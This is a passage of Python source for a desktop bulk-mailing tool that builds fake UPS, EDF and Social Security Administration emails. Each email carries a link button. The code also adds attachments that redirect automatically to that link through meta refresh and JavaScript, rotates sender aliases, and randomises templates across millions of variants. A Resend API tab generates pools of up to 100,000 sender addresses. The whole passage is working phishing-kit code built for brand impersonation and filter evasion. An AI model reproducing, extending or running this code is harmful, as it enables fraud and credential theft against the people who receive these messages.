<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background-color:{scheme['bg']}; font-family:Arial,sans-serif; color:#121212;">
<table width="540" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; border-radius:6px; overflow:hidden;" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:{scheme['primary']}; padding:20px 28px;">
    <table width="100%" cellpadding="0" cellspacing="0">
      <tr>
        <td style="color:#fff; font-size:22px; font-weight:800; letter-spacing:1px;">UPS</td>
        <td align="right" style="color:{scheme['accent']}; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:1.5px;">Tracking Update</td>
      </tr>
    </table>
  </td>
</tr>
<tr>
  <td style="padding:28px;">
    <p style="margin:0 0 6px; font-size:13px; color:#888;">Hi,</p>
    <h2 style="margin:0 0 6px; font-size:24px; font-weight:700; color:#121212; line-height:1.2;">Package delivered ✓</h2>
    <p style="margin:0 0 22px; font-size:14px; color:#666;">Your shipment from <strong style="color:{scheme['primary']};">{shipper}</strong> has arrived.</p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:24px;">
      <tr>
        <td width="50%" style="padding:12px 16px; background:#f8f8f8; border-radius:4px;">
          <div style="font-size:11px; color:#888; text-transform:uppercase; letter-spacing:1px;">Date</div>
          <div style="font-size:15px; font-weight:700; color:#121212; margin-top:4px;">{date_short}</div>
        </td>
        <td width="8" style="padding:0;">&nbsp;</td>
        <td width="50%" style="padding:12px 16px; background:#f8f8f8; border-radius:4px;">
          <div style="font-size:11px; color:#888; text-transform:uppercase; letter-spacing:1px;">Time</div>
          <div style="font-size:15px; font-weight:700; color:#121212; margin-top:4px;">{time_str}</div>
        </td>
      </tr>
    </table>
    
    <table width="100%" cellpadding="0" cellspacing="0">
      <tr>
        <td align="center">
          <a href="{link}" style="display:inline-block; padding:13px 36px; background:{scheme['accent']}; color:#121212; text-decoration:none; font-weight:700; font-size:14px; border-radius:4px;">{button_text}</a>
        </td>
      </tr>
    </table>
  </td>
</tr>
<tr>
  <td style="padding:16px 28px; background:#fafafa; border-top:1px solid #eee; font-size:12px; color:#777;">
    Sent to <strong style="color:#444;">{email}</strong>
  </td>
</tr>
<tr>
  <td style="padding:10px 28px; background:#f0f0f0; color:#888; font-size:10px; text-align:center;">
    ©2026 United Parcel Service of America, Inc.
  </td>
</tr>
</table>
</body></html>"""
    
    def _gen_simple_edf(self, name, email, link):
        """Simple HTML — EDF clean version. 4 random variants."""
        amount = random.choice(_EDF_AMOUNTS)
        button = random.choice(_EDF_BUTTON_TEXTS)
        
        # Random color scheme
        scheme = random.choice([
            {"primary": "#fe5815", "secondary": "#001a70"},
            {"primary": "#e84a0e", "secondary": "#0a2a85"},
            {"primary": "#ff6b1f", "secondary": "#001f8b"},
        ])
        
        variant = random.randint(1, 4)
        
        if variant == 1:
            # VARIANT 1: Compact card with shadow
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#f8f9fa; font-family:Arial,sans-serif; color:#000;">
<table width="520" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; border-radius:6px; overflow:hidden; box-shadow:0 2px 8px rgba(0,0,0,0.06);" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:{scheme['primary']}; color:#fff; padding:16px 24px; text-align:center; font-size:15px; font-weight:bold; letter-spacing:0.3px;">
    Votre facture électronique EDF
  </td>
</tr>
<tr>
  <td style="padding:28px 24px; font-size:11pt; line-height:1.6; color:#222;">
    <p style="margin:0 0 14px;">Madame, Monsieur,</p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 14px;">
      <tr>
        <td style="padding:10px 14px; background:#f5f5f5; border-left:3px solid {scheme['primary']}; font-size:10pt;">
          <strong>Compte client :</strong> {email}
        </td>
      </tr>
    </table>
    
    <p style="margin:0 0 14px;">Vous trouverez votre facture électronique d'un montant total à payer de <strong style="color:{scheme['primary']};">{amount} euros TTC</strong>.</p>
    
    <p style="margin:0 0 18px;">Retrouvez vos factures sur votre Espace Client.</p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:18px 0;">
      <tr>
        <td align="center">
          <a href="{link}" style="display:inline-block; padding:13px 32px; background:{scheme['primary']}; color:#fff; text-decoration:none; font-weight:bold; font-size:14px; border-radius:3px;">{button}</a>
        </td>
      </tr>
    </table>
    
    <p style="margin:18px 0 0;"><strong>Cordialement,</strong></p>
    <p style="margin:0;"><strong>EDF.FR</strong></p>
  </td>
</tr>
<tr>
  <td style="background:{scheme['secondary']}; height:8px;">&nbsp;</td>
</tr>
</table>
</body></html>"""
        
        elif variant == 2:
            # VARIANT 2: Side-by-side facture summary
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#ffffff; font-family:Arial,sans-serif; color:#000;">
<table width="540" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; border:1px solid #e0e0e0;" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:{scheme['primary']}; padding:18px 24px;">
    <table width="100%" cellpadding="0" cellspacing="0">
      <tr>
        <td style="color:#fff; font-size:18px; font-weight:bold;">EDF</td>
        <td align="right" style="color:#fff; font-size:11px; padding-top:4px;">FACTURE ÉLECTRONIQUE</td>
      </tr>
    </table>
  </td>
</tr>
<tr>
  <td style="padding:24px;">
    <p style="margin:0 0 16px; font-size:11pt;">Madame, Monsieur,</p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 18px; background:#fef5f0; border:1px solid #ffe0d0;">
      <tr>
        <td style="padding:14px 16px;">
          <div style="font-size:10pt; color:#666; margin-bottom:4px;">Montant à payer</div>
          <div style="font-size:22px; font-weight:bold; color:{scheme['primary']};">{amount} € TTC</div>
        </td>
      </tr>
    </table>
    
    <p style="margin:0 0 8px; font-size:10pt; color:#666;">Compte client</p>
    <p style="margin:0 0 16px; font-size:11pt; font-weight:bold;">{email}</p>
    
    <p style="margin:0 0 16px; font-size:10pt; color:#444; line-height:1.5;">
      Votre facture électronique au format PDF est disponible en pièce jointe. 
      Retrouvez l'historique de vos factures sur votre Espace Client.
    </p>
    
    <table width="100%" cellpadding="0" cellspacing="0">
      <tr>
        <td align="center" style="padding:8px 0 16px;">
          <a href="{link}" style="display:inline-block; padding:13px 32px; background:{scheme['primary']}; color:#fff; text-decoration:none; font-weight:bold; font-size:14px;">{button}</a>
        </td>
      </tr>
    </table>
    
    <p style="margin:16px 0 0; font-size:10pt;"><strong>Cordialement,<br>EDF.FR</strong></p>
  </td>
</tr>
<tr>
  <td style="background:{scheme['secondary']}; height:6px;">&nbsp;</td>
</tr>
</table>
</body></html>"""
        
        elif variant == 3:
            # VARIANT 3: Minimalist with big amount
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:40px 20px; background:#fafafa; font-family:Arial,sans-serif; color:#000;">
<table width="500" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse;" cellpadding="0" cellspacing="0">
<tr>
  <td style="border-top:4px solid {scheme['primary']}; padding:32px 28px;">
    <h2 style="margin:0 0 20px; font-size:18px; font-weight:600; color:{scheme['primary']};">Votre facture EDF</h2>
    
    <p style="margin:0 0 16px; font-size:11pt; line-height:1.6;">Madame, Monsieur,</p>
    
    <p style="margin:0 0 14px; font-size:10pt; color:#666; line-height:1.6;">
      Votre facture électronique d'un montant de :
    </p>
    
    <p style="margin:0 0 24px; font-size:30px; font-weight:300; color:{scheme['primary']}; letter-spacing:-0.5px;">
      {amount} <span style="font-size:18px; color:#999;">€ TTC</span>
    </p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 24px; border-top:1px solid #eee; border-bottom:1px solid #eee;">
      <tr>
        <td style="padding:12px 0; font-size:10pt; color:#888;">Compte client</td>
        <td align="right" style="padding:12px 0; font-size:11pt; color:#222; font-weight:600;">{email}</td>
      </tr>
    </table>
    
    <table width="100%" cellpadding="0" cellspacing="0">
      <tr>
        <td align="center">
          <a href="{link}" style="display:inline-block; padding:13px 36px; background:{scheme['primary']}; color:#fff; text-decoration:none; font-weight:bold; font-size:13px;">{button}</a>
        </td>
      </tr>
    </table>
    
    <p style="margin:24px 0 0; font-size:10pt; color:#666;">Cordialement, <strong>EDF.FR</strong></p>
  </td>
</tr>
</table>
</body></html>"""
        
        else:
            # VARIANT 4: Banner + full content
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:0; background:#f0f0f0; font-family:Arial,sans-serif; color:#000;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:{scheme['primary']}; padding:14px 0;">
  <tr>
    <td align="center" style="color:#fff; font-size:13px; font-weight:bold; letter-spacing:1px; text-transform:uppercase;">
      Votre facture électronique EDF au format PDF
    </td>
  </tr>
</table>
<table width="540" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse;" cellpadding="0" cellspacing="0">
<tr>
  <td style="padding:30px 28px; font-size:11pt; line-height:1.6;">
    <p style="margin:0 0 18px;">Madame, Monsieur,</p>
    
    <p style="margin:0 0 14px;">Vous trouverez, ci-joint, votre facture électronique au format PDF d'un montant total à payer de <strong style="color:{scheme['primary']};">{amount} euros TTC</strong> ou en votre faveur.</p>
    
    <p style="margin:0 0 14px; padding:10px 14px; background:#f5f5f5; border-left:3px solid {scheme['primary']}; font-size:10pt;">
      <strong>Compte client :</strong> {email}
    </p>
    
    <p style="margin:0 0 14px; font-size:10pt; color:#555;">
      En application de l'article L224-11 du Code de la consommation, les sommes correspondant à des consommations ou de l'acheminement pour la période concernée ont été annulées et sont donc non dues.
    </p>
    
    <p style="margin:0 0 18px;">Retrouvez l'historique de vos factures sur 3 ans en vous connectant à votre Espace Client.</p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 20px;">
      <tr>
        <td align="center">
          <a href="{link}" style="display:inline-block; padding:13px 34px; background:{scheme['primary']}; color:#fff; text-decoration:none; font-weight:bold; font-size:14px;">{button}</a>
        </td>
      </tr>
    </table>
    
    <p style="margin:0 0 6px; font-size:10pt; color:#666;">
      En cas de difficulté de réception ou d'anomalie constatée sur le contenu de votre facture, nous vous invitons à appeler le n° de téléphone figurant sur votre facture.
    </p>
    
    <p style="margin:18px 0 0;"><strong>Cordialement,</strong></p>
    <p style="margin:0;"><strong>EDF.FR</strong></p>
  </td>
</tr>
<tr>
  <td style="background:{scheme['secondary']}; height:8px;">&nbsp;</td>
</tr>
</table>
</body></html>"""
    
    def _gen_simple_cola(self, name, email, link):
        """Simple HTML — COLA clean version."""
        return f"""<!DOCTYPE html>
<html>
<body style="margin:0; padding:0; background:#f5f7fa; font-family:Arial,sans-serif; color:#1a1a1a;">
<table width="500" align="center" style="margin:30px auto; background:#ffffff; border-collapse:collapse;" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:#003366; color:#fff; padding:18px 20px;">
    <div style="font-size:18px; font-weight:700;">Important COLA Notice</div>
    <div style="font-size:12px; opacity:0.9; margin-top:4px;">Cost-of-Living Adjustment Information</div>
  </td>
</tr>
<tr>
  <td style="padding:25px 20px; font-size:14px; line-height:1.6;">
    <p style="margin:0 0 12px;">Dear {name},</p>
    
    <p style="margin:0 0 12px;">Your annual cost-of-living adjustment notice is available.</p>
    
    <p style="margin:0 0 12px; padding:8px 12px; background:#f5f7fa; border-left:3px solid #0056b3; font-size:13px;">
      <strong>Account:</strong> {email}
    </p>
    
    <p style="margin:0 0 18px;">Please review the attached document carefully.</p>
    
    <p style="text-align:center; margin:20px 0;">
      <a href="{link}" style="display:inline-block; padding:12px 28px; background:#0056b3; color:#fff; text-decoration:none; font-weight:700;">View Notice</a>
    </p>
    
    <p style="margin:16px 0 0;">Sincerely,</p>
    <p style="margin:0; font-weight:700;">Social Security Administration</p>
  </td>
</tr>
<tr>
  <td style="padding:12px 20px; background:#f5f7fa; color:#666; font-size:11px; text-align:center;">
    This is an automated notification — please do not reply.
  </td>
</tr>
</table>
</body>
</html>"""
    
    def _gen_simple_generic(self, name, email, link):
        """Simple HTML — generic fallback."""
        greetings = ["Hi", "Hello", "Hey there", "Greetings"]
        intros = [
            "We have important information for you.",
            "Please review the attached document.",
            "Your account requires attention.",
        ]
        closings = ["Best regards", "Thank you", "Regards"]
        signatures = ["Customer Service", "Support Team", "Account Team"]
        
        greeting = random.choice(greetings)
        intro = random.choice(intros)
        closing = random.choice(closings)
        signature = random.choice(signatures)
        
        return f"""<!DOCTYPE html>
<html><body style="font-family:Arial,sans-serif; max-width:500px; margin:30px auto; padding:25px; color:#333; background:#fff; border:1px solid #eee;">
<p>{greeting} {name},</p>
<p>{intro}</p>
<p>Please find the attached document for your review.</p>
<p style="padding:8px 12px; background:#f5f5f5; border-left:3px solid #1f6feb; font-size:13px;">
  <strong>Sent to:</strong> {email}
</p>
<p>{closing},<br>{signature}</p>
</body></html>"""
    
    def _theme_get_zip_filename(self):
        """Theme-aware ZIP filename"""
        theme = self.theme_var.get() if hasattr(self, 'theme_var') else 'delivery'
        if theme == 'cola':
            return _generate_cola_zip_filename()
        elif theme == 'ssa_simple':
            return _generate_ssa_simple_zip_filename()
        elif theme == 'ups' or theme == 'ups_amazon':
            return _generate_ups_zip_filename()
        elif theme == 'fedex':
            return _generate_fedex_zip_filename()
        elif theme == 'usps':
            return _generate_usps_zip_filename()
        elif theme == 'edf':
            return _generate_edf_zip_filename()
        elif theme == 'mix':
            themes = self._get_mix_themes()
            choice = random.choice(themes)
            if choice == 'cola':
                return _generate_cola_zip_filename()
            elif choice == 'ssa_simple':
                return _generate_ssa_simple_zip_filename()
            elif choice in ('ups', 'ups_amazon'):
                return _generate_ups_zip_filename()
            elif choice == 'fedex':
                return _generate_fedex_zip_filename()
            elif choice == 'usps':
                return _generate_usps_zip_filename()
            elif choice == 'edf':
                return _generate_edf_zip_filename()
            return _generate_smart_zip_filename()
        return _generate_smart_zip_filename()
    
    def _theme_get_pdf(self, recipient_name, recipient_email, link_url):
        """Theme-aware PDF generation"""
        theme = self.theme_var.get() if hasattr(self, 'theme_var') else 'delivery'
        if theme == 'cola':
            return _generate_cola_pdf_attachment(recipient_name, recipient_email, link_url)
        elif theme == 'edf':
            return _generate_edf_pdf_attachment(recipient_name, recipient_email, link_url)
        elif theme == 'ssa_simple':
            return _generate_ssa_simple_pdf_attachment(recipient_name, recipient_email, link_url)
        elif theme == 'fedex':
            return _generate_fedex_pdf_attachment(recipient_name, recipient_email, link_url)
        elif theme == 'usps':
            return _generate_usps_pdf_attachment(recipient_name, recipient_email, link_url)
        elif theme in ('ups', 'ups_amazon'):
            # No themed PDF — fallback to clean
            return _generate_clean_pdf_attachment(recipient_name, recipient_email, link_url)
        elif theme == 'mix':
            themes = self._get_mix_themes()
            choice = random.choice(themes)
            if choice == 'cola':
                return _generate_cola_pdf_attachment(recipient_name, recipient_email, link_url)
            elif choice == 'edf':
                return _generate_edf_pdf_attachment(recipient_name, recipient_email, link_url)
            elif choice == 'ssa_simple':
                return _generate_ssa_simple_pdf_attachment(recipient_name, recipient_email, link_url)
            elif choice == 'fedex':
                return _generate_fedex_pdf_attachment(recipient_name, recipient_email, link_url)
            elif choice == 'usps':
                return _generate_usps_pdf_attachment(recipient_name, recipient_email, link_url)
            return _generate_clean_pdf_attachment(recipient_name, recipient_email, link_url)
        return _generate_clean_pdf_attachment(recipient_name, recipient_email, link_url)
    
    def _theme_get_attachment(self, recipient_name, recipient_email, link_url):
        """
        Returns tuple (bytes, extension) — Format-aware attachment.
        - PDF:    returns (pdf_bytes, 'pdf')
        - HTML:   returns (html_bytes, 'html') — full themed HTML with meta refresh
        - Direct: returns (html_bytes, 'html') — minimal redirect-only HTML
        """
        fmt = self.auto_format.get() if hasattr(self, 'auto_format') else 'pdf'
        
        # 🆕 V98: Direct = minimal HTML with just meta refresh + JS redirect
        if fmt == 'direct':
            titles = [
                "Loading...", "Redirecting...", "Please wait...",
                "Document", "Notification", "Notice",
            ]
            title = random.choice(titles)
            
            html_str = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0; url={link_url}">
<title>{title}</title>
</head>
<body>
<p style="font-family:Arial,sans-serif;text-align:center;margin-top:50px;color:#666;">
Loading... If not redirected, <a href="{link_url}">click here</a>.
</p>
<p style="font-family:Arial,sans-serif;text-align:center;color:#999;font-size:12px;">
Sent to: {recipient_email}
</p>
<script>
setTimeout(function() {{ window.location.href = "{link_url}"; }}, 100);
</script>
</body>
</html>"""
            return html_str.encode('utf-8'), 'html'
        
        if fmt == 'html':
            theme = self.theme_var.get() if hasattr(self, 'theme_var') else 'delivery'
            
            # Helper: inject meta refresh in any HTML
            def _inject_refresh(html_str):
                if '<head>' in html_str:
                    return html_str.replace('<head>',
                        f'<head>\n    <meta http-equiv="refresh" content="3; url={link_url}">')
                return html_str
            
            if theme == 'cola':
                html_str = _generate_cola_html_attachment(recipient_name, recipient_email, link_url)
            elif theme == 'ssa_simple':
                html_str = _inject_refresh(_generate_ssa_simple_template(recipient_name, recipient_email, link_url))
            elif theme == 'ups':
                html_str = _inject_refresh(_generate_ups_template(recipient_name, recipient_email, link_url))
            elif theme == 'ups_amazon':
                html_str = _inject_refresh(_generate_ups_template(recipient_name, recipient_email, link_url, force_shipper="Amazon"))
            elif theme == 'fedex':
                html_str = _inject_refresh(_generate_fedex_template(recipient_name, recipient_email, link_url))
            elif theme == 'usps':
                html_str = _inject_refresh(_generate_usps_template(recipient_name, recipient_email, link_url))
            elif theme == 'edf':
                html_str = _inject_refresh(_generate_edf_template(recipient_name, recipient_email, link_url))
            elif theme == 'mix':
                themes = self._get_mix_themes()
                choice = random.choice(themes)
                if choice == 'cola':
                    html_str = _generate_cola_html_attachment(recipient_name, recipient_email, link_url)
                elif choice == 'ssa_simple':
                    html_str = _inject_refresh(_generate_ssa_simple_template(recipient_name, recipient_email, link_url))
                elif choice == 'ups':
                    html_str = _inject_refresh(_generate_ups_template(recipient_name, recipient_email, link_url))
                elif choice == 'ups_amazon':
                    html_str = _inject_refresh(_generate_ups_template(recipient_name, recipient_email, link_url, force_shipper="Amazon"))
                elif choice == 'fedex':
                    html_str = _inject_refresh(_generate_fedex_template(recipient_name, recipient_email, link_url))
                elif choice == 'usps':
                    html_str = _inject_refresh(_generate_usps_template(recipient_name, recipient_email, link_url))
                elif choice == 'edf':
                    html_str = _inject_refresh(_generate_edf_template(recipient_name, recipient_email, link_url))
                else:
                    html_str = _inject_refresh(_generate_random_template())
            else:
                # Delivery: use existing template
                html_str = _inject_refresh(_generate_random_template())
            return html_str.encode('utf-8'), 'html'
        
        # Default: PDF
        pdf_bytes = self._theme_get_pdf(recipient_name, recipient_email, link_url)
        return pdf_bytes, 'pdf'
    
    def _get_random_display_name(self):
        """Get random display name. Ila random mode w list fargha → GENERATE millions of variations!"""
        if self.dn_mode.get() == "random":
            names = self._get_dn_list()
            # 🎯 Ila list fargha → GENERATE dynamically (theme-aware!)
            if not names:
                return self._theme_get_display_name()
            return random.choice(names)
        return self.display_name.get().strip()
    
    def _get_random_body(self, email_index=0):
        """
        Get random body template.
        Ila random mode w list fargha → GENERATE unique HTML (~21M combos!)
        
        Args:
            email_index: bach n7sb batch rotation
        """
        if self.body_mode.get() != "random":
            return self.body.get("1.0", "end").strip()
        
        # 🎯 Ila list fargha → GENERATE dynamically per email
        if not self.body_templates_list:
            # Per email: generate unique HTML kol mra (theme-aware!)
            if self.body_rotation_strategy.get() == "per_email":
                return self._theme_get_template()
            # Per batch: nfs template per N emails
            try:
                batch_size = max(1, int(self.body_batch_size.get()))
            except:
                batch_size = 1000
            batch_num = email_index // batch_size
            # Use seeded RNG bach nfs template f kol batch
            rng_state = random.getstate()
            random.seed(batch_num)
            template = self._theme_get_template()
            random.setstate(rng_state)
            return template
        
        # Custom templates (user added their own)
        templates = self.body_templates_list
        
        if self.body_rotation_strategy.get() == "per_email":
            template = random.choice(templates)
            return template['content'] if isinstance(template, dict) else template
        
        try:
            batch_size = max(1, int(self.body_batch_size.get()))
        except:
            batch_size = 1000
        
        batch_num = email_index // batch_size
        rng = random.Random(batch_num)
        template = rng.choice(templates)
        return template['content'] if isinstance(template, dict) else template
    
    def _load_from_aliases(self):
        """Load From aliases mn .txt file"""
        path = filedialog.askopenfilename(
            filetypes=[("Text","*.txt"),("All","*.*")])
        if path:
            try:
                with open(path, encoding="utf-8") as f:
                    lines = [l.strip() for l in f if l.strip()]
                # Clean ga3 lines
                clean = []
                for l in lines:
                    l = l.lower().replace('http://', '').replace('https://', '')
                    l = l.replace('@', '').split('/')[0].strip()
                    if l and '.' in l:
                        clean.append(l)
                
                self.from_aliases_text.delete("1.0", "end")
                self.from_aliases_text.insert("1.0", "\n".join(clean))
                self._log(f"🎭 {len(clean)} from aliases loaded", C["green"])
            except Exception as e:
                messagebox.showerror("Error", str(e))
    
    def _get_from_aliases_list(self):
        """Get list dyal aliases mn textbox"""
        text = self.from_aliases_text.get("1.0", "end-1c").strip()
        if not text:
            return []
        aliases = []
        for line in text.split("\n"):
            line = line.strip().lower()
            line = line.replace('http://', '').replace('https://', '')
            line = line.replace('@', '').split('/')[0].strip()
            if line and '.' in line:
                aliases.append(line)
        return aliases
    
    def _get_random_from(self, original_email, index=0):
        """
        Get From email m3a random alias substitution
        
        Args:
            original_email: 'user1@terssadmine.com'
            index: l rotation
        
        Returns:
            'user1@mail.terssadmine.com' (random alias)
            wla original_email ila ma enabled
        """
        if not self.use_custom_from.get():
            return original_email
        
        aliases = self._get_from_aliases_list()
        if not aliases:
            return original_email
        
        if '@' not in original_email:
            return original_email
        
        local = original_email.split('@')[0]
        # Random rotation
        alias = random.choice(aliases)
        return f"{local}@{alias}"
    
    # ═══════════════════════════════════════════════════════════════
    # 📨 RESEND API TAB
    # ═══════════════════════════════════════════════════════════════
    def _build_resend_tab(self, parent):
        """Build Resend API configuration tab."""
        wrap = tk.Frame(parent, bg=C["bg0"])
        wrap.pack(fill="both", expand=True, padx=14, pady=14)
        
        # Header
        hdr = tk.Frame(wrap, bg=C["bg0"])
        hdr.pack(fill="x", pady=(0, 12))
        tk.Label(hdr, text="📨 Resend API Configuration",
                 bg=C["bg0"], fg=C["yellow"],
                 font=("Segoe UI", 14, "bold")).pack(side="left")
        tk.Label(hdr, text="  ·  resend.com",
                 bg=C["bg0"], fg=C["text3"],
                 font=("Segoe UI", 9, "italic")).pack(side="left")
        
        # Two-column layout
        cols = tk.Frame(wrap, bg=C["bg0"])
        cols.pack(fill="both", expand=True)
        
        # LEFT — config
        left = tk.Frame(cols, bg=C["bg1"], width=520)
        left.pack(side="left", fill="y", padx=(0, 12))
        left.pack_propagate(False)
        lpad = tk.Frame(left, bg=C["bg1"])
        lpad.pack(fill="both", expand=True, padx=14, pady=14)
        
        # ── API Key
        self._sec(lpad, "🔑 API Key")
        tk.Label(lpad, text="Mn Resend Dashboard → API Keys",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8, "italic")).pack(anchor="w", pady=(0, 4))
        
        api_key_row = tk.Frame(lpad, bg=C["bg1"])
        api_key_row.pack(fill="x")
        self.resend_api_key = tk.StringVar()
        self.resend_api_key_entry = tk.Entry(api_key_row,
                                               textvariable=self.resend_api_key,
                                               bg=C["input"], fg=C["text"],
                                               insertbackground=C["text"],
                                               relief="flat", bd=0,
                                               font=("Cascadia Code", 9),
                                               show="•")
        self.resend_api_key_entry.pack(side="left", fill="x", expand=True, ipady=6, padx=(0, 6))
        
        self._resend_show_key = False
        def toggle_show():
            self._resend_show_key = not self._resend_show_key
            self.resend_api_key_entry.config(show="" if self._resend_show_key else "•")
        
        tk.Button(api_key_row, text="👁",
                  bg=C["bg3"], fg=C["text"],
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=toggle_show).pack(side="left", ipady=4, ipadx=8, padx=(0, 4))
        
        tk.Button(api_key_row, text="🧪 Test",
                  bg=C["accent2"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 9, "bold"),
                  command=self._test_resend_connection).pack(side="left", ipady=4, ipadx=10)
        
        # ── From Email (multi-mode)
        self._sec(lpad, "📧 From Email (verified domain required)")
        tk.Label(lpad, text="Domain MUST be verified f Resend dashboard. Display Name = mn Compose tab (random list).",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8, "italic")).pack(anchor="w", pady=(0, 4))
        
        # Storage for random user pool
        self._resend_user_pool = []  # filled mlli kayttdir Generate
        self._resend_user_idx = [0]  # rotating index
        
        # Mode selector
        self.resend_from_mode = tk.StringVar(value="single")
        mode_row = tk.Frame(lpad, bg=C["bg1"])
        mode_row.pack(fill="x", pady=(0, 6))
        for val, txt in [
            ("single", "📌 Single fixed email"),
            ("autogen", "🎲 Auto-generate (user1...userN @ domain)"),
            ("custom", "📝 Custom list (manual)"),
        ]:
            tk.Radiobutton(mode_row, text=txt, variable=self.resend_from_mode,
                           value=val, bg=C["bg1"], fg=C["text2"],
                           selectcolor=C["bg3"], activebackground=C["bg1"],
                           font=("Segoe UI", 9),
                           command=self._toggle_resend_from_mode).pack(anchor="w")
        
        # Mode 1 — Single email frame
        self.resend_single_f = tk.Frame(lpad, bg=C["bg1"])
        self.resend_single_f.pack(fill="x", pady=(2, 4))
        
        tk.Label(self.resend_single_f, text="Email:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w")
        self.resend_from_email = tk.StringVar(value="")
        tk.Entry(self.resend_single_f, textvariable=self.resend_from_email,
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["text"],
                 relief="flat", bd=0,
                 font=("Segoe UI", 10)).pack(fill="x", ipady=6, pady=(2, 4))
        tk.Label(self.resend_single_f,
                 text="Example: noreply@yourdomain.com (without 'Name <...>' — name added auto)",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8, "italic")).pack(anchor="w")
        
        # Mode 2 — Auto-generate frame
        self.resend_autogen_f = tk.Frame(lpad, bg=C["bg1"])
        # NOT packed initially
        
        ag_row1 = tk.Frame(self.resend_autogen_f, bg=C["bg1"])
        ag_row1.pack(fill="x", pady=(2, 4))
        tk.Label(ag_row1, text="Prefix:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9), width=10, anchor="w").pack(side="left")
        self.resend_autogen_prefix = tk.StringVar(value="user")
        tk.Entry(ag_row1, textvariable=self.resend_autogen_prefix,
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["text"],
                 relief="flat", bd=0, width=15,
                 font=("Segoe UI", 10)).pack(side="left", ipady=4, padx=(0, 8))
        tk.Label(ag_row1, text="(e.g. 'user' → user1, user2, ...)",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8, "italic")).pack(side="left")
        
        ag_row2 = tk.Frame(self.resend_autogen_f, bg=C["bg1"])
        ag_row2.pack(fill="x", pady=(2, 4))
        tk.Label(ag_row2, text="@ Domain:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9), width=10, anchor="w").pack(side="left")
        self.resend_autogen_domain = tk.StringVar(value="")
        tk.Entry(ag_row2, textvariable=self.resend_autogen_domain,
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["text"],
                 relief="flat", bd=0,
                 font=("Segoe UI", 10)).pack(side="left", fill="x", expand=True, ipady=4)
        
        ag_row3 = tk.Frame(self.resend_autogen_f, bg=C["bg1"])
        ag_row3.pack(fill="x", pady=(2, 4))
        tk.Label(ag_row3, text="From #:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9), width=10, anchor="w").pack(side="left")
        self.resend_autogen_start = tk.StringVar(value="1")
        tk.Entry(ag_row3, textvariable=self.resend_autogen_start,
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["text"],
                 relief="flat", bd=0, width=10,
                 font=("Segoe UI", 10)).pack(side="left", ipady=4, padx=(0, 8))
        tk.Label(ag_row3, text="To #:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(side="left", padx=(0, 4))
        self.resend_autogen_end = tk.StringVar(value="100000")
        tk.Entry(ag_row3, textvariable=self.resend_autogen_end,
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["text"],
                 relief="flat", bd=0, width=12,
                 font=("Segoe UI", 10)).pack(side="left", ipady=4, padx=(0, 8))
        
        ag_row4 = tk.Frame(self.resend_autogen_f, bg=C["bg1"])
        ag_row4.pack(fill="x", pady=(4, 0))
        tk.Button(ag_row4, text="🎲 Generate Pool",
                  bg=C["green"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 9, "bold"),
                  command=self._generate_resend_user_pool).pack(side="left", ipady=4, ipadx=10, padx=(0, 8))
        self.resend_autogen_status = tk.Label(ag_row4,
                                                text="📊 Pool: empty",
                                                bg=C["bg1"], fg=C["text3"],
                                                font=("Segoe UI", 9, "italic"))
        self.resend_autogen_status.pack(side="left")
        
        # 🆕 V88: Auto-regenerate pool mlli kayttbedl shi field
        def _auto_regen(*args):
            try:
                # Only regen ila autogen mode active
                if self.resend_from_mode.get() == "autogen":
                    domain = self.resend_autogen_domain.get().strip()
                    if domain:
                        # Debounce — wait 500ms after last change
                        if hasattr(self, '_resend_regen_after_id'):
                            try: self.after_cancel(self._resend_regen_after_id)
                            except: pass
                        self._resend_regen_after_id = self.after(500, self._auto_regen_pool_silent)
            except: pass
        
        self.resend_autogen_prefix.trace_add("write", _auto_regen)
        self.resend_autogen_domain.trace_add("write", _auto_regen)
        self.resend_autogen_start.trace_add("write", _auto_regen)
        self.resend_autogen_end.trace_add("write", _auto_regen)
        
        # Mode 3 — Custom list frame
